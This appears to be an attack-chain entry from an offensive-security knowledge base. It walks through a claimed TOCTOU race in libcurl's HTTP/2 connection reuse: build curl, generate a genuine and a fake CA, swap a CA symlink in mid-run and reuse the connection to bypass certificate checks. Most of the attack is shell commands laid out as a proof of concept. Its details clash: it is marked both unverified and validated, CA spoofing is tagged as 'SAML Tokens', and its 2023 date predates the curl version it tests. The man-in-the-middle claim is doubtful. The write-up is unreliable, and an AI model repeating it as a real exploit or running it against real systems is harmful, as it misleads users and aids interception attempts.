---
tags:
  - toctou
  - race-condition
  - libcurl
  - http2
  - tls-bypass
  - mitm
  - certificate-validation
type: attack_chain
tools:
  - '[[tools/curl]]'
  - '[[tools/openssl]]'
  - '[[tools/wget]]'
  - '[[tools/tar]]'
  - '[[tools/python3]]'
tactics:
  - '[[Defense Evasion]]'
  - '[[Collection]]'
verified: false
platforms:
  - Linux
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Compile-curl-from-Source-with-HTTP2-Support]]'
  - '[[procedures/Generate-Legitimate-and-Fake-CA-Certificates]]'
  - '[[procedures/Start-HTTPS-Server-Supporting-HTTP2]]'
  - '[[procedures/Create-Symlink-to-Legitimate-CA-File]]'
  - '[[procedures/Execute-TOCTOU-CA-Swap-and-Curl-Requests]]'
  - '[[procedures/Observe-Vulnerability-Confirmation-in-Output]]'
step_count: 6
techniques:
  - '[[SAML Tokens]]'
  - '[[Adversary-in-the-Middle]]'
updated_at: '2025-12-14T17:24:19.170Z'
description: >-
  A multi-stage attack exploiting a TOCTOU race condition in libcurl's
  persistent HTTP/2 connections to bypass TLS certificate validation, enabling
  local MitM attacks on subsequent requests.
skill_level: intermediate
impact_level: high
id: a9d43f9e-3b4c-40c0-8873-37df5b04a77f
validated: true
mitre_tactics:
  - '[[Defense Evasion]]'
  - '[[Collection]]'
mitre_techniques:
  - '[[SAML Tokens]]'
  - '[[Adversary-in-the-Middle]]'
---
# TOCTOU Race Condition in libcurl HTTP/2 Connection Reuse for TLS Certificate Validation Bypass

Multi-stage attack chain demonstrating a TOCTOU race condition in libcurl that allows bypassing TLS certificate validation on reused HTTP/2 connections, enabling local attackers to perform MitM attacks in shared environments like hosting or containers.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Compile curl] --> B[Generate Certificates]
    B --> C[Start HTTPS Server]
    C --> D[Setup CA Symlink]
    D --> E[Execute Race Condition Swap and Requests]
    E --> F[Confirm Bypass]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#f39c12
    style F fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/curl]]
- [[tools/openssl]]
- [[tools/wget]]
- [[tools/tar]]
- [[tools/python3]]

### Target Environment

- Linux OS
- Ports: 8443 open for local HTTPS server
- Services: HTTP/2 over TLS
- Tech stack: curl 8.16.0, libcurl/8.16.0, OpenSSL/3.0.2, nghttp2/1.43.0, Python 3

### Initial Access Requirements

- Local access to the system running libcurl-based applications
- Ability to modify files (e.g., symlinks) in the working directory
- No network privileges beyond localhost

## Detailed Attack Procedures

### Step 1: Compile curl from Source
procedure: [[procedures/Compile-curl-from-Source-with-HTTP2-Support]]

**Objective**: Build a custom version of curl 8.16.0 with OpenSSL and nghttp2 support to test the vulnerability in a controlled environment.

**Instructions**: Download the source, configure with necessary flags, and compile using [[commands/wget-download-curl-source]]:

```bash
wget -q https://curl.se/download/curl-8.16.0.tar.gz && tar -xzf curl-8.16.0.tar.gz
```

Then configure with [[commands/configure-curl-build]]:

```bash
./configure --with-openssl --with-nghttp2 > /dev/null
```

Build with [[commands/make-build-curl]]:

```bash
make > /dev/null
```

Verify with [[commands/curl-version-check]]:

```bash
./src/curl --version
```

**Expected Output**: curl binary in src/ directory; version output shows curl 8.16.0 with OpenSSL and nghttp2.

**Success Indicators**:
- Source extracted to curl-8.16.0 directory
- Configuration completes without errors
- Build succeeds and version confirms features

### Step 2: Generate Certificates
procedure: [[procedures/Generate-Legitimate-and-Fake-CA-Certificates]]

**Objective**: Create legitimate and fake CA certificates, server key, and signed server certificate to simulate trusted and untrusted scenarios.

**Instructions**: Generate legit CA key with [[commands/openssl-genrsa-legit-ca]]:

```bash
openssl genrsa -out legit_ca.key 2048
```

Create legit CA cert with [[commands/openssl-req-legit-ca]]:

```bash
openssl req -x509 -new -nodes -key legit_ca.key -sha256 -days 365 -out legit_ca.crt -subj "/CN=Legit CA"
```

Generate fake CA key with [[commands/openssl-genrsa-fake-ca]]:

```bash
openssl genrsa -out fake_ca.key 2048
```

Create fake CA cert with [[commands/openssl-req-fake-ca]]:

```bash
openssl req -x509 -new -nodes -key fake_ca.key -sha256 -days 365 -out fake_ca.crt -subj "/CN=Fake CA"
```

Generate server key with [[commands/openssl-genrsa-server]]:

```bash
openssl genrsa -out server.key 2048
```

Create CSR with [[commands/openssl-req-server-csr]]:

```bash
openssl req -new -key server.key -out server.csr -subj "/CN=localhost"
```

Sign with legit CA using [[commands/openssl-x509-sign-server]]:

```bash
openssl x509 -req -in server.csr -CA legit_ca.crt -CAkey legit_ca.key -CAcreateserial -out server.crt -days 365 -sha256
```

**Expected Output**: Certificate files (legit_ca.crt, fake_ca.crt, server.crt, keys) created in current directory.

**Success Indicators**:
- All key and cert files generated without errors
- Server cert signed by legit CA

### Step 3: Start HTTPS Server
procedure: [[procedures/Start-HTTPS-Server-Supporting-HTTP2]]

**Objective**: Launch a local Python HTTPS server on port 8443 supporting HTTP/2 via ALPN to handle curl requests.

**Instructions**: Use Python's http.server module with SSL context, enabling ALPN for h2 and http/1.1, loading server cert and key. Run the server in a background thread serving on localhost:8443 with a simple handler returning 'OK' for /secure/data1 and /secure/data2 paths.

**Expected Output**: Server logs showing startup and request handling on port 8443.

**Success Indicators**:
- Server binds to localhost:8443 without errors
- Supports HTTP/2 protocol negotiation

### Step 4: Create Symlink to CA
procedure: [[procedures/Create-Symlink-to-Legitimate-CA-File]]

**Objective**: Set up a symlink for the CA bundle file pointing to the legitimate CA to allow initial validation.

**Instructions**: Create symlink using Python os.symlink or shell [[commands/ln-symlink-legit-ca]]:

```bash
ln -s legit_ca.crt ca.crt
```

**Expected Output**: Symlink ca.crt points to legit_ca.crt.

**Success Indicators**:
- Symlink created successfully
- ls -l shows ca.crt -> legit_ca.crt

### Step 5: Execute Race Condition
procedure: [[procedures/Execute-TOCTOU-CA-Swap-and-Curl-Requests]]

**Objective**: Perform the TOCTOU attack by swapping the CA symlink after initial handshake but before second request, exploiting connection reuse.

**Instructions**: In a background process, sleep then swap using [[commands/sleep-timing-window]]:

```bash
sleep 0.5
```

Remove old symlink with [[commands/rm-ca-symlink]]:

```bash
rm -f ca.crt
```

Create new symlink with [[commands/ln-symlink-fake-ca]]:

```bash
ln -s fake_ca.crt ca.crt
```

In foreground, run curl with [[commands/curl-http2-requests-with-cacert]]:

```bash
./src/curl --http2 -v --cacert ca.crt https://localhost:8443/secure/data1 --cacert ca.crt https://localhost:8443/secure/data2
```

**Expected Output**: Curl verbose output shows 'Re-using existing connection!' for second request without SSL errors; both requests return 'OK'.

**Success Indicators**:
- First request validates with legit CA
- Second request reuses connection without re-validation after swap
- No certificate errors despite fake CA

### Step 6: Confirm Vulnerability
procedure: [[procedures/Observe-Vulnerability-Confirmation-in-Output]]

**Objective**: Verify the bypass by checking curl output and server logs for successful requests without validation failures.

**Instructions**: Review curl -v output for connection reuse message and absence of SSL errors; check server logs for two successful GET requests to /secure/data1 and /secure/data2.

**Expected Output**: Logs confirm both requests processed over the same HTTP/2 connection.

**Success Indicators**:
- 'Re-using existing connection!' in curl output
- Server receives and responds to both requests
- No TLS handshake errors on second stream

## Attack Chain Summary

### Key Achievements

1. Successful compilation of vulnerable curl version
2. Setup of controlled HTTPS environment with swappable CAs
3. Exploitation of TOCTOU to bypass certificate validation on reused connections
4. Confirmation of MitM potential for data compromise

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[SAML Tokens]] Certificate Authority Spoofing
- [[Adversary-in-the-Middle]] Adversary-in-the-Middle

### MITRE ATT&CK Tactics

- [[Defense Evasion]] Defense Evasion
- [[Collection]] Collection

---

*Last updated: 2023-10-01T00:00:00Z*
